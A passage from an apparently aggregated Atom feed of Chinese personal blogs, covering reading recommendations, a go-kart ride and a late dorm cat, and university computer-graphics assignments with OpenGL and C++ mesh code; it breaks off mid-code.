        <link href="https://blog.vvzero.com/2018/12/03/channy-s-summer-holiday-reading/"/>
        <content type="text/html" src="https://blog.vvzero.com/2018/12/03/channy-s-summer-holiday-reading/"><![CDATA[<h2 id="现在还谈暑假？"><a href="#现在还谈暑假？" class="headerlink" title="现在还谈暑假？"></a>现在还谈暑假？</h2><p>是的吧，主要是玲玲的暑期读书分享前几天才发出来嘛~</p><p>我常常说，我的知识深度不行，但是知识广度还可以，但有的时候，被问起文学、现代文化等领域的时候，总是很惭愧，因为我实在没有读过几本书。要是现在有人问我“你最喜欢的一本文学小说是什么”，我恐怕脑中首先闪过的还是让人贻笑大方的《西游记》等。</p><p>好在玲玲完全填补了我的空缺……</p><h2 id="长令的暑期读书分享"><a href="#长令的暑期读书分享" class="headerlink" title="长令的暑期读书分享"></a>长令的暑期读书分享</h2><p>我想了想，还是不要把她发在公众号的文章copy&amp;paste了，我的排版也不好看。就直接上链接吧：</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU4ODQ4OTcyOQ==&amp;mid=2247483830&amp;idx=1&amp;sn=ff12dec368c05d5ce8d14286cda9316a&amp;chksm=fddab4d8caad3dce3c0d2b65d2042fb8160ac9f507895dce907106db240d175ddbd02fe5a394&amp;mpshare=1&amp;scene=1&amp;srcid=12033TBv55Hra7Uoozvqe8AL#rd" target="_blank" rel="noopener">暑期读书分享（上）</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU4ODQ4OTcyOQ==&amp;mid=2247483836&amp;idx=1&amp;sn=8bb8d5aa143d0cf3eed20c17b4b84d98&amp;chksm=fddab4d2caad3dc439156cd41a2281e9a825e441d3a4fb368a069ac99aec298baa03a1d1d48e&amp;mpshare=1&amp;scene=1&amp;srcid=12034PasL8Rzdu5maek0CvVm#rd" target="_blank" rel="noopener">暑期读书分享（下）</a></p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><img src="https://source.vvzero.com/channy_wechat_official_account.jpg" alt="&quot;长令记事&quot;公众号二维码"></p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/</id>
        <title><![CDATA[卡丁车与猫]]></title>
        <updated>2018-11-25T13:28:17+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/"><![CDATA[<p>本来打算拿纸做个架子把手机固定在帽子上全程拍摄<br>然而过弯力度太大手机左晃右晃最后还是甩了出去<br>就文字分享一下俊航卡丁车的体验吧<br>上车后工作人员发车发了好几次都没发着有点小尴尬<br>第一脚听到油门马达的轰鸣声立刻有种驾驭野兽的感觉<br>先不急第一圈模仿f1暖胎<br>在赛道上左右摇摆鲨鱼巡航<br>室内赛道长度较短但路面平整得甚至反光很适合漂移<br>车身很稳地摇完第一圈<br>第二圈开启运动模式<br>原谅我是个键盘车手油门只会踩到底<br>加速感超强入第一个弯前速度估计有30迈<br>减速 贴边 猛打方向盘 油门踩到底 方向盘反打<br>结果差点飘了180度<br>但还是不可避免的撞了路边轮胎<br>熟悉手感后就放开了<br>虽然地方小但弯道的布置很合理<br>漂移时skrskrskr~很刺激~<br>努力充分利用赛道感觉自己走线还可以~<br>我为车狂！！！</p><hr><p>一年前的12月，大寝有人从火锅店老板那里收了只幼猫，从此开始了有猫陪伴的日子。<br>如今猫咪已经不在，贴点照片和视频表达一下对它的想念。</p><iframe src="//player.bilibili.com/player.html?aid=35436376&cid=62120907&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe><p><img src="https://qiniu.karlrixon.cn/blog/181106/l7Eakg44il.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/mFfbFG81B7.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/dl7LHkc4mj.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/fI83g5gcDB.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/cd0Kmd8igj.png?imageslim" alt="mark"></p><p>这张好丑233</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/d0LbeC0d43.png?imageslim" alt="mark"></p><p>台灯下就适合思考</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DHHk9LAKgf.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/J8L798EBda.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/Djem79cGa6.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/2460HE0mfJ.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/EdCAhFh0Bh.png?imageslim" alt="mark"></p><p>尝试最舒服的睡姿。。</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/EeDAkDB6bc.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/8cFBhjj9Ac.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/HGJ0gIK2bI.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/aE8bf81maD.png?imageslim" alt="mark"></p><p>枕着算法书睡觉</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DIbjJ6Cjhk.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/deAFbCe92G.png?imageslim" alt="mark"></p><p>我是0排捷豹QAQ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/0kghK3mdKE.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/HIdB16aLb7.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/4BBIk4L2CE.png?imageslim" alt="mark"></p><p>专心点！</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/jj036eiHGj.png?imageslim" alt="mark"></p><p>你愁啥</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/bJ1iibhiCH.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DFLAIjKdjI.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/0alG7LB41h.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/h50ghHDb7a.png?imageslim" alt="mark"></p><p>这是老鼠吗</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/7khdeha147.png?imageslim" alt="mark"></p><p>老鼠就这味？</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/BD6H22j4Bi.png?imageslim" alt="mark"></p><p>你骗谁呢</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/bklELf1b5K.png?imageslim" alt="mark"></p><p>悟空</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/Lb9162KEC6.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/0Ddb9CgJFb.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/m43dfK70cb.png?imageslim" alt="mark"></p><p>想你了喵</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/CHj5e6cEde.png?imageslim" alt="mark"></p>]]></content>
        <author>
            <name><![CDATA[KarlRixon’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/Todo-List/</id>
        <title><![CDATA[Todo List]]></title>
        <updated>2018-11-23T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/Todo-List/"/>
        <content type="text/html" src="https://doublemice.github.io/Todo-List/"><![CDATA[Todo List]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/The-road-to-linux-kernel-exploit/</id>
        <title><![CDATA[The Road To Linux Kernel Exploit]]></title>
        <updated>2018-11-22T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/The-road-to-linux-kernel-exploit/"/>
        <content type="text/html" src="https://doublemice.github.io/The-road-to-linux-kernel-exploit/"><![CDATA[The Road To Linux Kernel Exploit]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/</id>
        <title><![CDATA[竞速游戏录屏剪辑]]></title>
        <updated>2018-11-11T11:07:14+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/"><![CDATA[<iframe src="//player.bilibili.com/player.html?aid=27825157&cid=48041818&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe>]]></content>
        <author>
            <name><![CDATA[KarlRixon’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/</id>
        <title><![CDATA[OpenGL设计小屋场景]]></title>
        <updated>2018-11-11T11:06:00+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/"><![CDATA[<h2 id="Grading-Scheme"><a href="#Grading-Scheme" class="headerlink" title="Grading Scheme"></a>Grading Scheme</h2><p>Your assignment will be graded by the following marking scheme:<br>Basic (80%)</p><ul><li>Planes (the left, right, and back walls, the ceiling and the floor)  10%</li><li>At least five different geometric primitives                  20%</li><li>At least five keyboard events (mouse event is optional)        15%</li><li>Object transformation animation (rotation, translating, scaling)  15%</li><li>General lighting control (different material properties setting)   20%</li></ul><p>Bonus (Up to 20%)</p><ul><li>Well-organized room                                       5%</li><li>Complex meaningful object constructed by different primitives      5%</li><li>Additional light (with different properties, on/off or transformation)  10%</li><li>Other creativities                                           10%</li></ul><p>Total                                                       100%<br>Note: No grade will be given if the program is incomplete.</p><h2 id="代码框架解读"><a href="#代码框架解读" class="headerlink" title="代码框架解读"></a>代码框架解读</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;GL/glut.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> GLdouble FRUSTDIM = <span class="number">100.0f</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">// All Setup For OpenGL Goes Here</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">glEnable(GL_DEPTH_TEST);</span><br><span class="line">glEnable(GL_LIGHTING);</span><br><span class="line">glEnable(GL_LIGHT0);</span><br><span class="line">glClear(GL_DEPTH_BUFFER_BIT | GL_COLOR_BUFFER_BIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">// Here's Where We Do All The Drawing</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Place light source here</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Draw walls and objects here</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Add animation here</span></span><br><span class="line"></span><br><span class="line">glutSwapBuffers();</span><br><span class="line">glFlush();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reshape</span><span class="params">(<span class="keyword">int</span> w, <span class="keyword">int</span> h)</span> <span class="comment">// Resize the GL Window. w=width, h=height</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">glViewport(<span class="number">0</span>, <span class="number">0</span>, (GLsizei) w, (GLsizei) h);</span><br><span class="line">glMatrixMode(GL_PROJECTION);</span><br><span class="line">glLoadIdentity();</span><br><span class="line">glFrustum(-FRUSTDIM, FRUSTDIM, -FRUSTDIM, FRUSTDIM, <span class="number">320.</span>, <span class="number">640.</span>);</span><br><span class="line">glMatrixMode(GL_MODELVIEW);</span><br><span class="line">glLoadIdentity();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">keyboard</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> key, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> <span class="comment">// Handle the keyboard events here</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">switch</span> (key) </span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">case</span>'\<span class="number">033'</span>:<span class="comment">//press 'esc' to quit</span></span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line">   <span class="comment">// Add keyboard control here</span></span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">idle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Initialization of GLUT Library */</span></span><br><span class="line">glutInit(&amp;argc, argv);</span><br><span class="line">glutInitDisplayMode(GLUT_RGBA|GLUT_DOUBLE|GLUT_DEPTH);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Create a window with title specified */</span></span><br><span class="line">glutCreateWindow(<span class="string">"Assignment 1"</span>);</span><br><span class="line">glutInitWindowSize(<span class="number">800</span>, <span class="number">600</span>);</span><br><span class="line">glutInitWindowPosition(<span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">init();<span class="comment">/*not GLUT call, initialize several parameters */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*Register different CALLBACK function for GLUT to response </span></span><br><span class="line"><span class="comment">with different events, e.g. window sizing, mouse click or</span></span><br><span class="line"><span class="comment">keyboard stroke */</span></span><br><span class="line">glutReshapeFunc(reshape);</span><br><span class="line">glutDisplayFunc(display);</span><br><span class="line">glutKeyboardFunc(keyboard);</span><br><span class="line">glutIdleFunc(idle);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Enter the GLUT event processing loop which never returns.</span></span><br><span class="line"><span class="comment">it will call different registered CALLBACK according</span></span><br><span class="line"><span class="comment">to different events. */</span></span><br><span class="line">glutMainLoop();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改和补充"><a href="#修改和补充" class="headerlink" title="修改和补充"></a>修改和补充</h2><p>作业框架中的一处bug：<code>main</code>函数中<code>glutCreateWindow</code>应当在<code>glutInitWindowSize</code>和<code>glutInitWindowPosition</code>之后。</p><p>在init函数中添加<code>glEnable(GL_NORMALIZE);</code>，<code>glEnable(GL_NORMALIZE)</code>是使<code>opengl</code>自动normalize 法向量，之所以需要自动normalize 法向量是因为法向量会受到<code>glScalef</code>的影响，当<code>glScalef</code>将物体的坐标放大k倍时，法向量变为1/k，因为opengl自己的光照计算要求法向量单位化，所以不重新单位化，计算结果就是错误的。<br>举个例子就是如果不添加<code>glEnable(GL_NORMALIZE);</code>在<code>display</code>函数中放大一个几何物体它的亮度就会变暗。</p><p>在<code>display</code>函数中添加<code>glClear(GL_DEPTH_BUFFER_BIT | GL_COLOR_BUFFER_BIT);</code>用于清除缓冲区。</p><p>在<code>display</code>函数中所有代码外套一个<code>glPushMatrix();</code>和<code>glPopMatrix();</code>保证每次回调时的矩阵栈为空。</p><h2 id="程序一：动画效果演示"><a href="#程序一：动画效果演示" class="headerlink" title="程序一：动画效果演示"></a>程序一：动画效果演示</h2><p><a href="https://github.com/KarlRixon/nuaa_cg/tree/master/%E4%BD%9C%E4%B8%9A%E4%B8%80/%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C" target="_blank" rel="noopener">源码</a></p><p><img src="https://qiniu.karlrixon.cn/blog/181020/0bFl5AJ2L5.png?imageslim" alt="mark"></p><h2 id="程序二：3D-room-scene"><a href="#程序二：3D-room-scene" class="headerlink" title="程序二：3D room scene"></a>程序二：3D room scene</h2><p><a href="https://github.com/KarlRixon/nuaa_cg/tree/master/作业一/房间设计" target="_blank" rel="noopener">源码</a></p><p><img src="https://qiniu.karlrixon.cn/blog/181020/h4G05EK5Cb.png?imageslim" alt="mark"></p><iframe src="//player.bilibili.com/player.html?aid=34258956&cid=60010777&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe>]]></content>
        <author>
            <name><![CDATA[KarlRixon’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/</id>
        <title><![CDATA[计算机图形学finalal_project:MeshViewer]]></title>
        <updated>2018-11-09T12:03:21+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/"><![CDATA[<h2 id="代码解读"><a href="#代码解读" class="headerlink" title="代码解读"></a>代码解读</h2><p>a.首先从<code>meshviewer.cpp</code>看起，里面包含main函数入口，打印使用说明，设置窗口信息，初始化灯光材质等信息，创建菜单，绘制图像，窗口大小变化回调，鼠标点击和移动回调，默认回调，键盘回调，网格模型处理，主循环</p><p>b.然后要读懂的是<code>MeshInterface.h</code>文件，包含网格模型处理的操作，了解<code>glNewList</code>和<code>glCallList</code></p><p>c.接着看内核头文件，<code>Kernal.h</code>和<code>ExKernal.h</code>里包含了所有后面写代码要用到的函数声明，<code>Kernal.h</code>中要注意的是何种半边句柄的转换函数，<code>ExKernal.h</code>中的高级功能函数需要了解</p><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>a.其中1. 2. 4. 5的函数声明在 mesh/extension/ExKernelT.h (截图如下)<br>函数实现请在mesh/extension/ExkernelT.cpp 中完成 (务必)</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/ie20LdjLk0.png?imageslim" alt="mark"></p><p>b.其中3的函数声明在read_write/read_write.h<br>函数实现请在read_write/read_write.cpp 中完成 (务必)</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/JmeG2b7D19.png?imageslim" alt="mark"></p><p>c.请把整个代码看明白，里面实现了各种基本操作，例如求三角网格中每个三角形的重心、求每个三角面片的法向等等。</p><p>d.程序运行截图如下：</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/eaf9Ghl9AG.png?imageslim" alt="mark"></p><p>e.鼠标点击右键，会出现一个操作界面，里面有一些灯光和其他绘制效果。</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/Gga208dGIg.png?imageslim" alt="mark"></p><h2 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h2><blockquote><p>计算三角网格中每个三角形(face)的面积；10分</p></blockquote><p>此函数声明为： Scalar calc_facet_area(const FacetHandle&amp; _fh); //给定一个三角面片，计算它的面积<br>Tips: 可以根据程序输出结果判定是否计算正确，例如，输入模型cow.off，它的所有三角面片中，面积最大的三角面片的面积为：The maximal area of the mesh is: 0.0494426</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">typename</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Scalar</span><br><span class="line">  ExKernelT&lt;ExItems&gt;::calc_facet_area(<span class="keyword">const</span> FacetHandle&amp; _fh)&#123;<span class="comment">/////计算三角形的面积</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">///得到半边句柄</span></span><br><span class="line">    HalfedgeHandle&amp; hh1 = halfedge_handle(_fh);</span><br><span class="line">    HalfedgeHandle&amp; hh2 = next_halfedge_handle(hh1);</span><br><span class="line">    HalfedgeHandle&amp; hh3 = next_halfedge_handle(hh2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////由半边句柄得到边句柄</span></span><br><span class="line">    EdgeHandle&amp; eh1 = edge_handle(hh1);</span><br><span class="line">    EdgeHandle&amp; eh2 = edge_handle(hh2);</span><br><span class="line">    EdgeHandle&amp; eh3 = edge_handle(hh3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////由边句柄得到各边长</span></span><br><span class="line">    <span class="keyword">float</span> a = calc_edge_length(eh1);</span><br><span class="line">    <span class="keyword">float</span> b = calc_edge_length(eh2);</span><br><span class="line">    <span class="keyword">float</span> c = calc_edge_length(eh3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////利用海伦公式求面积s=sqrt(p(p-a)(p-b)(p-c))</span></span><br><span class="line">    Scalar area = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">float</span> p = (a + b + c) / <span class="number">2</span>;</span><br><span class="line">    area = <span class="built_in">sqrt</span>(p*(p - a)*(p - b)*(p - c));</span><br><span class="line"></span><br><span class="line">    facet_ref(_fh).area_ = area;</span><br><span class="line">    <span class="keyword">return</span> area;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/d8DIbDC712.png?imageslim" alt="mark"></p><h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><blockquote><p>计算三角网格中每个顶点(vertex) 的法向；20分</p></blockquote><p>此函数声明为：inline Normal calc_normal(const VertexHandle&amp; _vh);///计算顶点的法向值<br>Tips: 注意归一化。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt; </span></span><br><span class="line"><span class="class"><span class="title">typename</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Normal</span><br><span class="line">  ExKernelT&lt;ExItems&gt;::calc_normal(<span class="keyword">const</span> VertexHandle&amp; _vh) &#123;<span class="comment">////更新一个顶点的法向</span></span><br><span class="line">    assert( _vh.is_valid());</span><br><span class="line">    assert( _vh.idx() &lt; vertex_size() );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Normal          norm(1,1,1);///////用norm存储求得的法向值</span></span><br><span class="line">    <span class="function">Normal          <span class="title">norm</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////在此实现////////////////////////////////////</span></span><br><span class="line">    HalfedgeHandle firstHH = halfedge_handle(_vh);</span><br><span class="line">    FacetHandle fh = facet_handle(firstHH);</span><br><span class="line">    norm = norm + calc_normal(fh);</span><br><span class="line">    HalfedgeHandle hh = opposite_halfedge_handle(next_halfedge_handle(firstHH));</span><br><span class="line">    <span class="keyword">while</span> (hh != firstHH) &#123;</span><br><span class="line">      norm = norm + calc_normal(fh);</span><br><span class="line">      hh = opposite_halfedge_handle(next_halfedge_handle(hh));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> norm.normalize();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><blockquote><p>用OpenGL把三角网格中每个三角面片(face)的法向画出来（提示：在每个三角面片的重心处画）；20分</p></blockquote><p>此函数声明为：bool ogl_writer2(bool _orient = true, bool _smooth = false);<br>Tips: 可以参照函数bool ogl_writer(bool  _orient = true, bool _smooth = false)的来实现，这时只需要在每个三角面片中画出法向即可（法向用Line表示。按键盘上”m”可以查看画出面片法向后的结果。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">Mesh</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span 